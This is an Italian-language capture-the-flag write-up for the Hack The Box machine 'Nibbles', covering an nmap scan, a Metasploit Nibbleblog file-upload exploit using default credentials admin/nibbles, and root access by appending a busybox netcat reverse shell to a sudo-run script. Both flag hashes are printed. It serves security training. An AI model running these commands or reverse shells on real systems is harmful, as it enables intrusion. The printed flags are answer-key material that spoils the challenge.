![](nibbles.png)
# Nibbles -Hack The Box Writeup
## scansione nmap
```bash
nmap -sCV -O iptarget
```
vedere codice sorgente
direcotry nibbleblog
```bash
searchsploit nibbleblog         
nibbleblog 4.0.3 - Arbitrary File Upload (Met | php/remote/38489.rb
```
## cerchiamo le credenziali di default nibbleblog sul web 
username=admin
password=nibbles
```bash
msfconsole
search nibbleblog
set targeturi /nibbleblog
set username admin
set password nibbles
set rhost iptarget
set lhost ipnostro
```
shell ottenuta
## impostiamo una shell stabile
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
cd /home/nibbler/user.txt
cat user.txt
```
# Flag user
## 6aa021b68e3017c7032b697a0591683b
# Privilege escalation
```bash
sudo -l
monitor.sh programma che ci permette di eseguire il privilege escalation
```
echo "busybox nc 10.10.14.130 8000 -e /bin/sh" >> monitor.sh
Apriamo un nuovo terminale
```bash
nc -lnvp 8000
```
eseguiamo il programma
```bash
sudo ./monitor.sh
```
spostiamoci nel terminale creato
```bash
whoami
root
cd /root/root.txt
cat root.txt
```
# Flag root
## 81cec606565092a2efaf3bf62dcc861d
